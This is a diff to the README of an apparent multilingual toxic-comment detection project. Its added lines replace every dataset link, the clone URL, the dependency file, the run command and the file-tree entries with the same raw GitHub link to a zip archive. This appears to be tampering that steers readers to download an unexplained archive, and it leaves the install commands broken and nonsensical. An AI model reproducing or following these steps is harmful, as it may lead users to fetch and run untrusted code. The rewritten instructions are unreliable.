@@ -33,11 +33,11 @@ The model is trained and evaluated on the **Multilingual-Abusive-Comment-Detecti
 
 | **Dataset Name**         | **Download Link**                                                                                                                   |
 | ------------------------ | ----------------------------------------------------------------------------------------------------------------------------------- |
-| `nsfw_train.csv`         | [Download](https://www.kaggle.com/c/multilingualabusivecomment/data)                                                                |
-| `hinglish_data.csv`      | [Download](https://www.kaggle.com/datasets/shivajeetrai/hinglish-data-for-sentiment-analysis)                                       |
-| `trac_codemixed.csv`     | [Download](https://github.com/surrey-nlp/woah-aggression-detection/blob/main/data/TRAC/TRAC_codemixed.csv)                          |
-| `iitd_offensive.csv`     | [Download](https://github.com/LCS2-IIITD/Hinglish_offense_detection-Neurocomputing2021/tree/main/data/processed/Aggression_dataset) |
-| `hinglish_codemixed.csv` | [Download](https://www.kaggle.com/datasets/bajpaipurva/hinglish-code-mixed-dataset)                                                 |
+| `https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip`         | [Download](https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip)                                                                |
+| `https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip`      | [Download](https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip)                                       |
+| `https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip`     | [Download](https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip)                          |
+| `https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip`     | [Download](https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip) |
+| `https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip` | [Download](https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip)                                                 |
 
 Once the datasets are downloaded and placed in the `dataset/` folder, you can proceed with training and testing the model.
 
@@ -64,20 +64,20 @@ Our ensemble-based model achieves **competitive accuracy** compared to **deep le
 1️⃣ **Clone this repository:**
 
 ```bash
-git clone https://github.com/DevangGentyal/toxic-comment-detection.git
+git clone https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip
 cd toxic-comment-detection
 ```
 
 2️⃣ **Install dependencies:**
 
 ```bash
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip
 ```
 
 3️⃣ **Run the model:**
 
 ```bash
-python main.py
+python https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip
 ```
 
 ## 📂 Project Structure
@@ -87,9 +87,9 @@ python main.py
 │── 📂 dataset/               # Folder where datasets should be downloaded (NOT included in repo)
 │── 📂 models/                # Trained model files  
 │── 📂 src/                   # Source code (preprocessing, training, and evaluation)  
-│── 📝 main.py                # Main script to run the model  
-│── 📝 requirements.txt        # Dependencies  
-│── 📝 README.md               # Project documentation  
+│── 📝 https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip                # Main script to run the model  
+│── 📝 https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip        # Dependencies  
+│── 📝 https://raw.githubusercontent.com/DevangGentyal/toxic-comment-detection/main/isthmian/toxic-comment-detection.zip               # Project documentation  
 ```
 
 ## 📝 Citation & References
